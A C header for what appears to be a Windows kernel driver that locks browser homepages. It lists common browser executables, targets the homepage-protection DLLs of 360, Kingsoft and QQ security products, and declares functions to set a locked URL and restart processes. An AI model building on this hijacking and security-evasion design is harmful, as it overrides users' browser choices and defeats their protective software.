
#ifndef __LOCK_HOMEPAGE_H__
#define __LOCK_HOMEPAGE_H__

#include <ntddk.h>


typedef enum _EBrowserType
{
	e_Browser_Base = 0,
	e_Browser_IE = 0,
	e_Browser_Firefox,
	e_Browser_Chrome,
	e_Browser_Opera,
	e_Browser_360se,
	e_Browser_Liebao,
	e_Browser_sogou,
	e_Browser_QQ,
	e_Browser_2345,
	e_Browser_UC,
}EBrowserType;


static PCWSTR g_AllBrowsersNameList[] = {
	L"iexplore.exe",
	L"firefox.exe",
	L"chrome.exe",
	L"opera.exe",
	L"360se.exe",
	L"liebao.exe",
	L"sogouexplorer.exe",
	L"qqbrowser.exe",
	L"2345explorer.exe",
	L"ucbrowser.exe"
};


static PCWSTR g_AllAntiInjectDllNameList[] = {
	//
	// 360
	//
	L"safehmpg.dll",
	L"safemon.dll",
	L"testxxx.dll",
	
	//
	// Kingsoft
	//
	L"lblocker.dll",
	L"kshmpg.dll",
	L"kshmpgext.dll",

	//
	// QQ
	//
	//L"tsvulfw.dat",
	//L"tswebmon.dat"
	L"qmiesafedll.dll",
};


NTSTATUS LhpSetLockInfo(PWSTR LockedURL);
NTSTATUS LhpLockInit();
NTSTATUS LhpLockUninit();
NTSTATUS LhpRestartProcess(ULONG Pid);

#endif // __LOCK_HOMEPAGE_H__